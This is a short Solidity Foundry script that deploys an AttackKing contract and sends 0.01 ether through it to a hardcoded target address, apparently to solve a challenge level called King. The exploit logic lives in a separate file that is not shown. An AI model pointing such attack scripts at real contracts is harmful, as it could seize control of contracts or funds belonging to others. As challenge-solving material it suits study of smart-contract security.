//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {King} from "../src/King.sol";
import {AttackKing} from "../src/AttackKing.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackKingScript is Script {
    address public target = 0x2E02e99B97b922811dCa50387BA2B469FFEB42a8;
    AttackKing public attack;

    function run() external{
        
        vm.startBroadcast();
        attack = new AttackKing();
        attack.calltheKingFunction{value:0.01 ether}(target);
        console.log("New King is Crowned");
        vm.stopBroadcast();
    }

}